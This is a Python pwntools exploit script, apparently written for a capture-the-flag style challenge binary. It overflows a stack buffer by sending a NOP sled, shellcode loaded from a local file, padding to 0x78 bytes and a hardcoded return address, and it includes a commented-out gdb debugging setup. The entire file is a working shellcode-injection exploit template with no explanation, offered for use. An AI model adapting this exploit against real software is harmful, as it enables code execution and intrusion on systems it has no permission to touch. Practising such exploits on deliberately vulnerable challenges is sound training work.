#!/usr/bin/python3
from pwn import *

context.binary = binary = ELF("", checksec=False)
context.log_level = "critical"
bp = ""
pack = make_packer("all")

_gdb = '''
set disassembly-flavor intel
display/8i $rip
display/x $rbp
display/x $rsp
display/x $rax
break *challenge+0x2bb
break _exit
c
'''

p = process()
#p = gdb.debug(bp, gdbscript=_gdb, terminal=["tmux", "splitw", "-h"])

shellcode = b"\x90" * 8
with open("./shelltext", "rb") as f:
    shellcode += f.read()
shellcode = bytes(shellcode)
shellcode += bytes.fromhex("41" * (int("0x78",16)-len(shellcode)))
shellcode += pack(0x00007fffffffd1f0)
size = bytes(str(int(len(shellcode))),encoding="utf-8")

p.recv()
p.sendline(size)
p.recv()
p.sendline(shellcode)
print(p.recv())
